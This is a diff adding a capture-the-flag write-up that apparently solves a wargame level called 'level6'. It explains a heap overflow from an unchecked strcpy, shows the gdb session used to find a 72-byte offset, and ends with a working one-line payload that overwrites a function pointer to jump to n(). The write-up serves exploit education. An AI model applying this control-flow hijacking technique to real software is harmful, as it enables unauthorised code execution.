@@ -1,0 +1,32 @@
+See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.
+
+In this Level, we will use strcpy which is not safely used as it takes argv[1] as parameter for a buffer of 64 bytes, any bytes over 64 is an overflow, in this case a heap overflow, because the buffer is on the heap.
+
+We use this vulnerability to overwrite a function pointer and redirect execution from m() to n().
+
+We use gdb to find the address returned by malloc() for both the function pointer and the buffer, we then substract the buffer address to the function pointer address to find the required padding for our overflow attack.
+
+finding the address of the function pointer:
+
+(gdb) break *0x080484a1
+(gdb) run
+(gdb) info registers eax
+eax            0x804a050	134520912
+
+-->0x804a050
+
+finding the address of buffer :
+
+(gdb) x/wx $esp+0x1c 0xbffff63c: 0x0804a008
+
+required padding :
+
+(gdb) p/d 0x804a050-0x0804a008
+$3 = 72
+
+address of n() 0x08048454 -> ""\x54\x84\x04\x08" with little endian
+
+
+Since the program expects the payload in argv[1], we need to pass the generated payload as a command-line argument. We can use command substitution so that the output of the Python command becomes argv[1].
+
+./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
